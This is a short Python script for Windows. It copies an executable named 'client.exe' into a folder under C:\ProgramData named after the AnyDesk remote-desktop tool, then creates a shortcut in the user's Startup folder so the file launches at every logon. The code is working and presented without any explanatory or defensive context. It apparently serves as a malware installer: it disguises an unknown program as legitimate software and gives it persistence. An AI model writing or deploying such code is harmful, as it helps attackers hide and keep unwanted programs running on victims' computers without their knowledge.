import os
import sys
import shutil
import pythoncom
from win32com.shell import shell, shellcon


def create_shortcut(target, shortcut_path):
    startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut = os.path.join(startup_folder, shortcut_path)
    if os.path.exists(shortcut):
        os.unlink(shortcut)

    shell_link = pythoncom.CoCreateInstance(
        shell.CLSID_ShellLink,
        None,
        pythoncom.CLSCTX_INPROC_SERVER,
        shell.IID_IShellLink
    )
    shell_link.SetPath(target)
    shell_link.SetWorkingDirectory(os.path.dirname(target))

    persist_file = shell_link.QueryInterface(pythoncom.IID_IPersistFile)
    persist_file.Save(shortcut, 0)


if __name__ == "__main__":
    exe_path = os.path.join(os.getcwd(), "client.exe")
    anydesk_path = r"C:\ProgramData\AnyDesk"
    anydesk_client_path = os.path.join(anydesk_path, "client.exe")

    if not os.path.exists(anydesk_path):
        os.makedirs(anydesk_path)

    shutil.copy2(exe_path, anydesk_client_path)

    shortcut_name = "client.lnk"

    create_shortcut(anydesk_client_path, shortcut_name)
    print(f"Shortcut for {anydesk_client_path} created in the Startup folder.")
